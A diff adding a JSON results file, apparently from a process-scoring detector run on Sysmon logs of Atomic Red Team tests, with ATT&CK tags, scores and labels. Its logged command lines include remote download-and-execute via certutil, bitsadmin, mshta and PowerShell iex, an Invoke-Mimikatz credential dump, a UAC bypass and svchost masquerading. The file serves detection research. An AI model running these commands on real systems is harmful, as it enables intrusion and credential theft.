@@ -1,0 +1,2265 @@
+{
+ "files": [
+  "T1105__atomic_red_team__windows-sysmon",
+  "T1059.001__atomic_red_team__windows-sysmon",
+  "T1547.001__atomic_red_team__windows-sysmon",
+  "T1003.001__atomic_red_team__windows-sysmon",
+  "T1053.005__lateral_movement__windows-sysmon",
+  "T1486__dcrypt__windows-sysmon"
+ ],
+ "nodes": [
+  {
+   "guid": "{896A638B-B3E2-605B-6969-00000000AE01}",
+   "parent": "",
+   "stage": 1,
+   "source": "T1105__atomic_red_team__windows-sysmon",
+   "prob": 0.89,
+   "tier": "HIGH",
+   "exe": "cmd.exe",
+   "count": 1,
+   "cmd": "\"c:\\windows\\system32\\cmd.exe\" /c \"cmd /c certutil -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/license.txt atomic-license.txt\" ",
+   "launched_via": [
+    "powershell.exe"
+   ],
+   "attack_tags": [
+    {
+     "id": "T1105",
+     "name": "Ingress tool transfer",
+     "tactic": "Command and Control"
+    }
+   ],
+   "actions": [],
+   "real_label": 1
+  },
+  {
+   "guid": "{896A638B-B3E2-605B-6A69-00000000AE01}",
+   "parent": "{896A638B-B3E2-605B-6969-00000000AE01}",
+   "stage": 1,
+   "source": "T1105__atomic_red_team__windows-sysmon",
+   "prob": 0.693,
+   "tier": "REVIEW",
+   "exe": "cmd.exe",
+   "count": 1,
+   "cmd": "\"cmd /c certutil -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/license.txt atomic-license.txt\"  ",
+   "launched_via": [
+    "cmd.exe"
+   ],
+   "attack_tags": [
+    {
+     "id": "T1105",
+     "name": "Ingress tool transfer",
+     "tactic": "Command and Control"
+    }
+   ],
+   "actions": [],
+   "real_label": 1
+  },
+  {
+   "guid": "{896A638B-B3E2-605B-6B69-00000000AE01}",
+   "parent": "{896A638B-B3E2-605B-6A69-00000000AE01}",
+   "stage": 1,
+   "source": "T1105__atomic_red_team__windows-sysmon",
+   "prob": 0.877,
+   "tier": "HIGH",
+   "exe": "certutil.exe",
+   "count": 1,
+   "cmd": "certutil  -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/license.txt atomic-license.txt\"  ",
+   "launched_via": [
+    "cmd.exe"
+   ],
+   "attack_tags": [
+    {
+     "id": "T1105",
+     "name": "Ingress tool transfer",
+     "tactic": "Command and Control"
+    }
+   ],
+   "actions": [
+    "file created -> c:\\users\\admini~1\\appdata\\local\\temp\\2\\atomic-license.txt"
+   ],
+   "real_label": 1
+  },
+  {
+   "guid": "{896A638B-B3E4-605B-6E69-00000000AE01}",
+   "parent": "",
+   "stage": 1,
+   "source": "T1105__atomic_red_team__windows-sysmon",
+   "prob": 0.793,
+   "tier": "HIGH",
+   "exe": "cmd.exe",
+   "count": 1,
+   "cmd": "\"c:\\windows\\system32\\cmd.exe\" /c \"c:\\windows\\system32\\bitsadmin.exe /transfer qcxjb7 /priority high https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/license.txt %%temp%%\\atomic-license.txt\" ",
+   "launched_via": [
+    "powershell.exe"
+   ],
+   "attack_tags": [
+    {
+     "id": "T1105",
+     "name": "Ingress tool transfer",
+     "tactic": "Command and Control"
+    }
+   ],
+   "actions": [],
+   "real_label": 1
+  },
+  {
+   "guid": "{896A638B-B3E4-605B-6F69-00000000AE01}",
+   "parent": "{896A638B-B3E4-605B-6E69-00000000AE01}",
+   "stage": 1,
+   "source": "T1105__atomic_red_team__windows-sysmon",
+   "prob": 0.733,
+   "tier": "HIGH",
+   "exe": "bitsadmin.exe",
+   "count": 1,
+   "cmd": "c:\\windows\\system32\\bitsadmin.exe  /transfer qcxjb7 /priority high https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/license.txt c:\\users\\admini~1\\appdata\\local\\temp\\2\\atomic-license.txt ",
+   "launched_via": [
+    "cmd.exe"
+   ],
+   "attack_tags": [
+    {
+     "id": "T1105",
+     "name": "Ingress tool transfer",
+     "tactic": "Command and Control"
+    }
+   ],
+   "actions": [],
+   "real_label": 1
+  },
+  {
+   "guid": "{896A638B-B3E7-605B-7169-00000000AE01}",
+   "parent": "",
+   "stage": 1,
+   "source": "T1105__atomic_red_team__windows-sysmon",
+   "prob": 0.62,
+   "tier": "REVIEW",
+   "exe": "cmd.exe",
+   "count": 1,
+   "cmd": "\"c:\\windows\\system32\\cmd.exe\" /c \"pushd \\\\localhost\\c$ & echo var fileobject = wscript.createobject(\"scripting.filesystemobject\");var newfile = fileobject.createtextfile(\"atomictestfilet1105.js\", true);newfile.writeline(\"this is an atomic red team test file for t1105. it simulates how ostap worms ac",
+   "launched_via": [
+    "powershell.exe"
+   ],
+   "attack_tags": [],
+   "actions": [],
+   "real_label": 1
+  },
+  {
+   "guid": "{896A638B-B3E7-605B-7269-00000000AE01}",
+   "parent": "{896A638B-B3E7-605B-7169-00000000AE01}",
+   "stage": 1,
+   "source": "T1105__atomic_red_team__windows-sysmon",
+   "prob": 0.377,
+   "tier": "REVIEW",
+   "exe": "cscript.exe",
+   "count": 1,
+   "cmd": "cscript.exe  atomictestt1105.js //e:jscript ",
+   "launched_via": [
+    "cmd.exe"
+   ],
+   "attack_tags": [],
+   "actions": [],
+   "real_label": 1
+  },
+  {
+   "guid": "{896A638B-B3E7-605B-7369-00000000AE01}",
+   "parent": "",
+   "stage": 1,
+   "source": "T1105__atomic_red_team__windows-sysmon",
+   "prob": 0.783,
+   "tier": "HIGH",
+   "exe": "cmd.exe",
+   "count": 1,
+   "cmd": "\"c:\\windows\\system32\\cmd.exe\" /c \"copy c:\\windows\\system32\\cmd.exe c:\\svchost.exe & c:\\svchost.exe /c echo t1105 > \\\\localhost\\c$\\t1105.txt\" ",
+   "launched_via": [
+    "powershell.exe"
+   ],
+   "attack_tags": [
+    {
+     "id": "T1036",
+     "name": "Masquerading as svchost",
+     "tactic": "Defense Evasion"
+    }
+   ],
+   "actions": [
+    "file created -> c:\\svchost.exe"
+   ],
+   "real_label": 1
+  },
+  {
+   "guid": "{896A638B-B3E7-605B-7469-00000000AE01}",
+   "parent": "{896A638B-B3E7-605B-7369-00000000AE01}",
+   "stage": 1,
+   "source": "T1105__atomic_red_team__windows-sysmon",
+   "prob": 0.463,
+   "tier": "REVIEW",
+   "exe": "svchost.exe",
+   "count": 1,
+   "cmd": "c:\\svchost.exe  /c echo t1105  ",
+   "launched_via": [
+    "cmd.exe"
+   ],
+   "attack_tags": [],
+   "actions": [],
+   "real_label": 1
+  },
+  {
+   "guid": "{896A638B-B3E7-605B-7569-00000000AE01}",
+   "parent": "",
+   "stage": 1,
+   "source": "T1105__atomic_red_team__windows-sysmon",
+   "prob": 0.927,
+   "tier": "HIGH",
+   "exe": "cmd.exe",
+   "count": 1,
+   "cmd": "\"c:\\windows\\system32\\cmd.exe\" /c \"cd \"%%programdata%%\\microsoft\\windows defender\\platform\\4.18*\" & mpcmdrun.exe -downloadfile -url https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/license.txt -path %%temp%%\\atomic-license.txt\" ",
+   "launched_via": [
+    "powershell.exe"
+   ],
+   "attack_tags": [
+    {
+     "id": "T1105",
+     "name": "Ingress tool transfer",
+     "tactic": "Command and Control"
+    }
+   ],
+   "actions": [],
+   "real_label": 1
+  },
+  {
+   "guid": "{896A638B-B3E7-605B-7669-00000000AE01}",
+   "parent": "{896A638B-B3E7-605B-7569-00000000AE01}",
+   "stage": 1,
+   "source": "T1105__atomic_red_team__windows-sysmon",
+   "prob": 0.73,
+   "tier": "HIGH",
+   "exe": "mpcmdrun.exe",
+   "count": 1,
+   "cmd": "mpcmdrun.exe  -downloadfile -url https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/license.txt -path c:\\users\\admini~1\\appdata\\local\\temp\\2\\atomic-license.txt ",
+   "launched_via": [
+    "cmd.exe"
+   ],
+   "attack_tags": [
+    {
+     "id": "T1105",
+     "name": "Ingress tool transfer",
+     "tactic": "Command and Control"
+    }
+   ],
+   "actions": [],
+   "real_label": 1
+  },
+  {
+   "guid": "{896A638B-B3F6-605B-7869-00000000AE01}",
+   "parent": "",
+   "stage": 1,
+   "source": "T1105__atomic_red_team__windows-sysmon",
+   "prob": 0.55,
+   "tier": "REVIEW",
+   "exe": "certutil.exe",
+   "count": 1,
+   "cmd": "\"c:\\windows\\system32\\certutil.exe\" /verifyctl -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/license.txt ",
+   "launched_via": [
+    "wmiprvse.exe"
+   ],
+   "attack_tags": [
+    {
+     "id": "T1105",
+     "name": "Ingress tool transfer",
+     "tactic": "Command and Control"
+    }
+   ],
+   "actions": [],
+   "real_label": 1
+  },
+  {
+   "guid": "{896A638B-B3FA-605B-7A69-00000000AE01}",
+   "parent": "",
+   "stage": 1,
+   "source": "T1105__atomic_red_team__windows-sysmon",
+   "prob": 0.55,
+   "tier": "REVIEW",
+   "exe": "certutil.exe",
+   "count": 1,
+   "cmd": "\"c:\\windows\\system32\\certutil.exe\" \u2013verifyctl -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/license.txt ",
+   "launched_via": [
+    "wmiprvse.exe"
+   ],
+   "attack_tags": [
+    {
+     "id": "T1105",
+     "name": "Ingress tool transfer",
+     "tactic": "Command and Control"
+    }
+   ],
+   "actions": [],
+   "real_label": 1
+  },
+  {
+   "guid": "{896A638B-B3FF-605B-7F69-00000000AE01}",
+   "parent": "",
+   "stage": 1,
+   "source": "T1105__atomic_red_team__windows-sysmon",
+   "prob": 0.55,
+   "tier": "REVIEW",
+   "exe": "certutil.exe",
+   "count": 1,
+   "cmd": "\"c:\\windows\\system32\\certutil.exe\" \u2015verifyctl -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/license.txt ",
+   "launched_via": [
+    "wmiprvse.exe"
+   ],
+   "attack_tags": [
+    {
+     "id": "T1105",
+     "name": "Ingress tool transfer",
+     "tactic": "Command and Control"
+    }
+   ],
+   "actions": [],
+   "real_label": 1
+  },
+  {
+   "guid": "{896A638B-B403-605B-8169-00000000AE01}",
+   "parent": "",
+   "stage": 1,
+   "source": "T1105__atomic_red_team__windows-sysmon",
+   "prob": 0.55,
+   "tier": "REVIEW",
+   "exe": "certutil.exe",
+   "count": 1,
+   "cmd": "\"c:\\windows\\system32\\certutil.exe\" \u2014verifyctl -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/license.txt ",
+   "launched_via": [
+    "wmiprvse.exe"
+   ],
+   "attack_tags": [
+    {
+     "id": "T1105",
+     "name": "Ingress tool transfer",
+     "tactic": "Command and Control"
+    }
+   ],
+   "actions": [],
+   "real_label": 1
+  },
+  {
+   "guid": "{896A638B-B407-605B-8369-00000000AE01}",
+   "parent": "",
+   "stage": 1,
+   "source": "T1105__atomic_red_team__windows-sysmon",
+   "prob": 0.55,
+   "tier": "REVIEW",
+   "exe": "certutil.exe",
+   "count": 1,
+   "cmd": "\"c:\\windows\\system32\\certutil.exe\" -verifyctl -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/license.txt ",
+   "launched_via": [
+    "wmiprvse.exe"
+   ],
+   "attack_tags": [
+    {
+     "id": "T1105",
+     "name": "Ingress tool transfer",
+     "tactic": "Command and Control"
+    }
+   ],
+   "actions": [],
+   "real_label": 1
+  },
+  {
+   "guid": "{896A638B-B41B-605B-8969-00000000AE01}",
+   "parent": "",
+   "stage": 1,
+   "source": "T1105__atomic_red_team__windows-sysmon",
+   "prob": 0.543,
+   "tier": "REVIEW",
+   "exe": "certutil.exe",
+   "count": 1,
+   "cmd": "\"c:\\windows\\system32\\certutil.exe\" \u2014urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/license.txt c:\\temp\\foo.txt",
+   "launched_via": [
+    "wmiprvse.exe"
+   ],
+   "attack_tags": [
+    {
+     "id": "T1105",
+     "name": "Ingress tool transfer",
+     "tactic": "Command and Control"
+    }
+   ],
+   "actions": [
+    "file created -> c:\\temp\\foo.txt"
+   ],
+   "real_label": 1
+  },
+  {
+   "guid": "{896A638B-B422-605B-8B69-00000000AE01}",
+   "parent": "",
+   "stage": 1,
+   "source": "T1105__atomic_red_team__windows-sysmon",
+   "prob": 0.543,
+   "tier": "REVIEW",
+   "exe": "certutil.exe",
+   "count": 1,
+   "cmd": "\"c:\\windows\\system32\\certutil.exe\" \u2013urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/license.txt c:\\temp\\foo.txt",
+   "launched_via": [
+    "wmiprvse.exe"
+   ],
+   "attack_tags": [
+    {
+     "id": "T1105",
+     "name": "Ingress tool transfer",
+     "tactic": "Command and Control"
+    }
+   ],
+   "actions": [
+    "file created -> c:\\temp\\foo.txt"
+   ],
+   "real_label": 1
+  },
+  {
+   "guid": "{896A638B-B42B-605B-8D69-00000000AE01}",
+   "parent": "",
+   "stage": 1,
+   "source": "T1105__atomic_red_team__windows-sysmon",
+   "prob": 0.543,
+   "tier": "REVIEW",
+   "exe": "certutil.exe",
+   "count": 1,
+   "cmd": "\"c:\\windows\\system32\\certutil.exe\" \u2015urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/license.txt c:\\temp\\foo.txt",
+   "launched_via": [
+    "wmiprvse.exe"
+   ],
+   "attack_tags": [
+    {
+     "id": "T1105",
+     "name": "Ingress tool transfer",
+     "tactic": "Command and Control"
+    }
+   ],
+   "actions": [],
+   "real_label": 1
+  },
+  {
+   "guid": "{896A638B-B432-605B-8F69-00000000AE01}",
+   "parent": "",
+   "stage": 1,
+   "source": "T1105__atomic_red_team__windows-sysmon",
+   "prob": 0.543,
+   "tier": "REVIEW",
+   "exe": "certutil.exe",
+   "count": 1,
+   "cmd": "\"c:\\windows\\system32\\certutil.exe\" /urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/license.txt c:\\temp\\foo.txt",
+   "launched_via": [
+    "wmiprvse.exe"
+   ],
+   "attack_tags": [
+    {
+     "id": "T1105",
+     "name": "Ingress tool transfer",
+     "tactic": "Command and Control"
+    }
+   ],
+   "actions": [
+    "file created -> c:\\temp\\foo.txt"
+   ],
+   "real_label": 1
+  },
+  {
+   "guid": "{38b9f94a-e3cf-6754-8b80-000000002f03}",
+   "parent": "",
+   "stage": 1,
+   "source": "T1105__atomic_red_team__windows-sysmon",
+   "prob": 0.59,
+   "tier": "REVIEW",
+   "exe": "certutil.exe",
+   "count": 1,
+   "cmd": "certutil  /url http://7-zip.org/a/7z1604-x64.exe",
+   "launched_via": [
+    "cmd.exe"
+   ],
+   "attack_tags": [
+    {
+     "id": "T1105",
+     "name": "Ingress tool transfer",
+     "tactic": "Command and Control"
+    }
+   ],
+   "actions": [],
+   "real_label": 1
+  },
+  {
+   "guid": "{05ADC7E1-7061-603D-5088-00000000AD01}",
+   "parent": "",
+   "stage": 2,
+   "source": "T1059.001__atomic_red_team__windows-sysmon",
+   "prob": 0.713,
+   "tier": "HIGH",
+   "exe": "cmd.exe",
+   "count": 1,
+   "cmd": "\"c:\\windows\\system32\\cmd.exe\" /c \"powershell.exe \"iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/powershellmafia/powersploit/f650520c4b1004daf8b3ec08007a0b945b91253a/exfiltration/invoke-mimikatz.ps1'); invoke-mimikatz -dumpcreds\"\" ",
+   "launched_via": [
+    "powershell.exe"
+   ],
+   "attack_tags": [
+    {
+     "id": "T1105",
+     "name": "Ingress tool transfer",
+     "tactic": "Command and Control"
+    },
+    {
+     "id": "T1003",
+     "name": "Credential dumping",
+     "tactic": "Credential Access"
+    }
+   ],
+   "actions": [],
+   "real_label": 1
+  },
+  {
+   "guid": "{05ADC7E1-7061-603D-5188-00000000AD01}",
+   "parent": "{05ADC7E1-7061-603D-5088-00000000AD01}",
+   "stage": 2,
+   "source": "T1059.001__atomic_red_team__windows-sysmon",
+   "prob": 0.55,
+   "tier": "REVIEW",
+   "exe": "powershell.exe",
+   "count": 1,
+   "cmd": "powershell.exe  \"iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/powershellmafia/powersploit/f650520c4b1004daf8b3ec08007a0b945b91253a/exfiltration/invoke-mimikatz.ps1'); invoke-mimikatz -dumpcreds\" ",
+   "launched_via": [
+    "cmd.exe"
+   ],
+   "attack_tags": [
+    {
+     "id": "T1105",
+     "name": "Ingress tool transfer",
+     "tactic": "Command and Control"
+    },
+    {
+     "id": "T1003",
+     "name": "Credential dumping",
+     "tactic": "Credential Access"
+    }
+   ],
+   "actions": [],
+   "real_label": 1
+  },
+  {
+   "guid": "{05ADC7E1-706F-603D-5588-00000000AD01}",
+   "parent": "",
+   "stage": 2,
+   "source": "T1059.001__atomic_red_team__windows-sysmon",
+   "prob": 0.49,
+   "tier": "REVIEW",
+   "exe": "powershell.exe",
+   "count": 1,
+   "cmd": "\"c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe\" & {$url='https://raw.githubusercontent.com/powershellmafia/powersploit/f650520c4b1004daf8b3ec08007a0b945b91253a/exfiltration/invoke-mimikatz.ps1';$wshell=new-object -comobject wscript.shell;$reg='hkcu:\\software\\microsoft\\notepad';$app='note",
+   "launched_via": [
+    "powershell.exe"
+   ],
+   "attack_tags": [
+    {
+     "id": "T1003",
+     "name": "Credential dumping",
+     "tactic": "Credential Access"
+    }
+   ],
+   "actions": [],
+   "real_label": 1
+  },
+  {
+   "guid": "{05ADC7E1-706F-603D-5688-00000000AD01}",
+   "parent": "{05ADC7E1-706F-603D-5588-00000000AD01}",
+   "stage": 2,
+   "source": "T1059.001__atomic_red_team__windows-sysmon",
+   "prob": 0.967,
+   "tier": "HIGH",
+   "exe": "notepad.exe",
+   "count": 1,
+   "cmd": "notepad",
+   "launched_via": [
+    "powershell.exe"
+   ],
+   "attack_tags": [],
+   "actions": [],
+   "real_label": 1
+  },
+  {
+   "guid": "{05ADC7E1-7071-603D-5788-00000000AD01}",
+   "parent": "",
+   "stage": 2,
+   "source": "T1059.001__atomic_red_team__windows-sysmon",
+   "prob": 0.723,
+   "tier": "HIGH",
+   "exe": "cmd.exe",
+   "count": 1,
+   "cmd": "\"c:\\windows\\system32\\cmd.exe\" /c \"powershell.exe \"iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/enigma0x3/misc-powershell-stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/invoke-apppathbypass.ps1'); invoke-apppathbypass -payload 'c:\\windows\\system32\\cmd.exe'\"\" ",
+   "launched_via": [
+    "powershell.exe"
+   ],
+   "attack_tags": [
+    {
+     "id": "T1105",
+     "name": "Ingress tool transfer",
+     "tactic": "Command and Control"
+    }
+   ],
+   "actions": [],
+   "real_label": 1
+  },
+  {
+   "guid": "{05ADC7E1-7071-603D-5888-00000000AD01}",
+   "parent": "{05ADC7E1-7071-603D-5788-00000000AD01}",
+   "stage": 2,
+   "source": "T1059.001__atomic_red_team__windows-sysmon",
+   "prob": 0.393,
+   "tier": "REVIEW",
+   "exe": "powershell.exe",
+   "count": 1,
+   "cmd": "powershell.exe  \"iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/enigma0x3/misc-powershell-stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/invoke-apppathbypass.ps1'); invoke-apppathbypass -payload 'c:\\windows\\system32\\cmd.exe'\" ",
+   "launched_via": [
+    "cmd.exe"
+   ],
+   "attack_tags": [
+    {
+     "id": "T1105",
+     "name": "Ingress tool transfer",
+     "tactic": "Command and Control"
+    }
+   ],
+   "actions": [],
+   "real_label": 1
+  },
+  {
+   "guid": "{05ADC7E1-7072-603D-5988-00000000AD01}",
+   "parent": "",
+   "stage": 2,
+   "source": "T1059.001__atomic_red_team__windows-sysmon",
+   "prob": 0.743,
+   "tier": "HIGH",
+   "exe": "cmd.exe",
+   "count": 1,
+   "cmd": "\"c:\\windows\\system32\\cmd.exe\" /c \"powershell.exe -exec bypass -noprofile \"$commsxml=new-object -comobject msxml2.serverxmlhttp;$commsxml.open('get','https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/t1059.001/src/test.ps1',$false);$commsxml.send();iex $commsxml.responsetex",
+   "launched_via": [
+    "powershell.exe"
+   ],
+   "attack_tags": [],
+   "actions": [],
+   "real_label": 1
+  },
+  {
+   "guid": "{05ADC7E1-7072-603D-5A88-00000000AD01}",
+   "parent": "{05ADC7E1-7072-603D-5988-00000000AD01}",
+   "stage": 2,
+   "source": "T1059.001__atomic_red_team__windows-sysmon",
+   "prob": 0.633,
+   "tier": "REVIEW",
+   "exe": "powershell.exe",
+   "count": 1,
+   "cmd": "powershell.exe  -exec bypass -noprofile \"$commsxml=new-object -comobject msxml2.serverxmlhttp;$commsxml.open('get','https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/t1059.001/src/test.ps1',$false);$commsxml.send();iex $commsxml.responsetext\" ",
+   "launched_via": [
+    "cmd.exe"
+   ],
+   "attack_tags": [],
+   "actions": [],
+   "real_label": 1
+  },
+  {
+   "guid": "{05ADC7E1-7072-603D-5B88-00000000AD01}",
+   "parent": "",
+   "stage": 2,
+   "source": "T1059.001__atomic_red_team__windows-sysmon",
+   "prob": 0.85,
+   "tier": "HIGH",
+   "exe": "cmd.exe",
+   "count": 1,
+   "cmd": "\"c:\\windows\\system32\\cmd.exe\" /c \"\"c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe\" -exec bypass -noprofile \"$xml = (new-object system.xml.xmldocument);$xml.load('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/t1059.001/src/test.xml');$xml.command.a.execute | ",
+   "launched_via": [
+    "powershell.exe"
+   ],
+   "attack_tags": [],
+   "actions": [],
+   "real_label": 1
+  },
+  {
+   "guid": "{05ADC7E1-7072-603D-5C88-00000000AD01}",
+   "parent": "{05ADC7E1-7072-603D-5B88-00000000AD01}",
+   "stage": 2,
+   "source": "T1059.001__atomic_red_team__windows-sysmon",
+   "prob": 0.57,
+   "tier": "REVIEW",
+   "exe": "powershell.exe",
+   "count": 1,
+   "cmd": "\"c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe\"  -exec bypass -noprofile \"$xml = (new-object system.xml.xmldocument);$xml.load('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/t1059.001/src/test.xml');$xml.command.a.execute | iex\" ",
+   "launched_via": [
+    "cmd.exe"
+   ],
+   "attack_tags": [],
+   "actions": [],
+   "real_label": 1
+  },
+  {
+   "guid": "{05ADC7E1-7073-603D-5D88-00000000AD01}",
+   "parent": "",
+   "stage": 2,
+   "source": "T1059.001__atomic_red_team__windows-sysmon",
+   "prob": 0.963,
+   "tier": "HIGH",
+   "exe": "cmd.exe",
+   "count": 1,
+   "cmd": "\"c:\\windows\\system32\\cmd.exe\" /c \"c:\\windows\\system32\\cmd.exe /c \"mshta.exe javascript:a=getobject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/t1059.001/src/mshta.sct').exec();close()\"\" ",
+   "launched_via": [
+    "powershell.exe"
+   ],
+   "attack_tags": [
+    {
+     "id": "T1218.005",
+     "name": "Mshta proxy execution",
+     "tactic": "Defense Evasion"
+    }
+   ],
+   "actions": [],
+   "real_label": 1
+  },
+  {
+   "guid": "{05ADC7E1-7073-603D-5E88-00000000AD01}",
+   "parent": "{05ADC7E1-7073-603D-5D88-00000000AD01}",
+   "stage": 2,
+   "source": "T1059.001__atomic_red_team__windows-sysmon",
+   "prob": 0.97,
+   "tier": "HIGH",
+   "exe": "cmd.exe",
+   "count": 1,
+   "cmd": "c:\\windows\\system32\\cmd.exe  /c \"mshta.exe javascript:a=getobject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/t1059.001/src/mshta.sct').exec();close()\" ",
+   "launched_via": [
+    "cmd.exe"
+   ],
+   "attack_tags": [
+    {
+     "id": "T1218.005",
+     "name": "Mshta proxy execution",
+     "tactic": "Defense Evasion"
+    }
+   ],
+   "actions": [],
+   "real_label": 1
+  },
+  {
+   "guid": "{05ADC7E1-7073-603D-5F88-00000000AD01}",
+   "parent": "{05ADC7E1-7073-603D-5E88-00000000AD01}",
+   "stage": 2,
+   "source": "T1059.001__atomic_red_team__windows-sysmon",
+   "prob": 0.823,
+   "tier": "HIGH",
+   "exe": "mshta.exe",
+   "count": 1,
+   "cmd": "mshta.exe  javascript:a=getobject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/t1059.001/src/mshta.sct').exec();close() ",
+   "launched_via": [
+    "cmd.exe"
+   ],
+   "attack_tags": [
+    {
+     "id": "T1218.005",
+     "name": "Mshta proxy execution",
+     "tactic": "Defense Evasion"
+    }
+   ],
+   "actions": [
+    "network -> 185.199.110.133:443",
+    "dns -> raw.githubusercontent.com"
+   ],
+   "real_label": 1
+  },
+  {
+   "guid": "{05ADC7E1-70EC-603D-7188-00000000AD01}",
+   "parent": "",
+   "stage": 2,
+   "source": "T1059.001__atomic_red_team__windows-sysmon",
+   "prob": 0.773,
+   "tier": "HIGH",
+   "exe": "powershell.exe",
+   "count": 1,
+   "cmd": "\"c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe\" & {powershell.exe -version 2 -command write-host $psversion} ",
+   "launched_via": [
+    "powershell.exe"
+   ],
+   "attack_tags": [],
+   "actions": [],
+   "real_label": 1
+  },
+  {
+   "guid": "{05ADC7E1-70EC-603D-7288-00000000AD01}",
+   "parent": "{05ADC7E1-70EC-603D-7188-00000000AD01}",
+   "stage": 2,
+   "source": "T1059.001__atomic_red_team__windows-sysmon",
+   "prob": 0.48,
+   "tier": "REVIEW",
+   "exe": "powershell.exe",
+   "count": 1,
+   "cmd": "\"c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe\" -version 2 -command write-host ",
+   "launched_via": [
+    "powershell.exe"
+   ],
+   "attack_tags": [],
+   "actions": [],
+   "real_label": 1
+  },
+  {
+   "guid": "{05ADC7E1-6D1E-603E-52AA-00000000AD01}",
+   "parent": "",
+   "stage": 2,
+   "source": "T1059.001__atomic_red_team__windows-sysmon",
+   "prob": 0.45,
+   "tier": "REVIEW",
+   "exe": "powershell.exe",
+   "count": 25,
+   "cmd": "\"c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe\" -noprofile -comma write-host b9825dcd-3aa0-4f6d-8404-4aa582c8dbff",
+   "launched_via": [
+    "powershell.exe"
+   ],
+   "attack_tags": [],
+   "actions": [],
+   "real_label": 0
+  },
+  {
+   "guid": "{05ADC7E1-6E2B-603E-F6AA-00000000AD01}",
+   "parent": "",
+   "stage": 2,
+   "source": "T1059.001__atomic_red_team__windows-sysmon",
+   "prob": 0.713,
+   "tier": "HIGH",
+   "exe": "cmd.exe",
+   "count": 1,
+   "cmd": "\"c:\\windows\\system32\\cmd.exe\" /c \"powershell.exe \"iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/powershellmafia/powersploit/f650520c4b1004daf8b3ec08007a0b945b91253a/exfiltration/invoke-mimikatz.ps1'); invoke-mimikatz -dumpcreds\"\" ",
+   "launched_via": [
+    "powershell.exe"
+   ],
+   "attack_tags": [
+    {
+     "id": "T1105",
+     "name": "Ingress tool transfer",
+     "tactic": "Command and Control"
+    },
+    {
+     "id": "T1003",
+     "name": "Credential dumping",
+     "tactic": "Credential Access"
+    }
+   ],
+   "actions": [],
+   "real_label": 1
+  },
+  {
+   "guid": "{05ADC7E1-6E2B-603E-F7AA-00000000AD01}",
+   "parent": "{05ADC7E1-6E2B-603E-F6AA-00000000AD01}",
+   "stage": 2,
+   "source": "T1059.001__atomic_red_team__windows-sysmon",
+   "prob": 0.55,
+   "tier": "REVIEW",
+   "exe": "powershell.exe",
+   "count": 1,
+   "cmd": "powershell.exe  \"iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/powershellmafia/powersploit/f650520c4b1004daf8b3ec08007a0b945b91253a/exfiltration/invoke-mimikatz.ps1'); invoke-mimikatz -dumpcreds\" ",
+   "launched_via": [
+    "cmd.exe"
+   ],
+   "attack_tags": [
+    {
+     "id": "T1105",
+     "name": "Ingress tool transfer",
+     "tactic": "Command and Control"
+    },
+    {
+     "id": "T1003",
+     "name": "Credential dumping",
+     "tactic": "Credential Access"
+    }
+   ],
+   "actions": [],
+   "real_label": 1
+  },
+  {
+   "guid": "{05ADC7E1-6E39-603E-FBAA-00000000AD01}",
+   "parent": "",
+   "stage": 2,
+   "source": "T1059.001__atomic_red_team__windows-sysmon",
+   "prob": 0.49,
+   "tier": "REVIEW",
+   "exe": "powershell.exe",
+   "count": 1,
+   "cmd": "\"c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe\" & {$url='https://raw.githubusercontent.com/powershellmafia/powersploit/f650520c4b1004daf8b3ec08007a0b945b91253a/exfiltration/invoke-mimikatz.ps1';$wshell=new-object -comobject wscript.shell;$reg='hkcu:\\software\\microsoft\\notepad';$app='note",
+   "launched_via": [
+    "powershell.exe"
+   ],
+   "attack_tags": [
+    {
+     "id": "T1003",
+     "name": "Credential dumping",
+     "tactic": "Credential Access"
+    }
+   ],
+   "actions": [],
+   "real_label": 1
+  },
+  {
+   "guid": "{05ADC7E1-6E39-603E-FCAA-00000000AD01}",
+   "parent": "{05ADC7E1-6E39-603E-FBAA-00000000AD01}",
+   "stage": 2,
+   "source": "T1059.001__atomic_red_team__windows-sysmon",
+   "prob": 0.967,
+   "tier": "HIGH",
+   "exe": "notepad.exe",
+   "count": 1,
+   "cmd": "notepad",
+   "launched_via": [
+    "powershell.exe"
+   ],
+   "attack_tags": [],
+   "actions": [],
+   "real_label": 1
+  },
+  {
+   "guid": "{05ADC7E1-6E3B-603E-FDAA-00000000AD01}",
+   "parent": "",
+   "stage": 2,
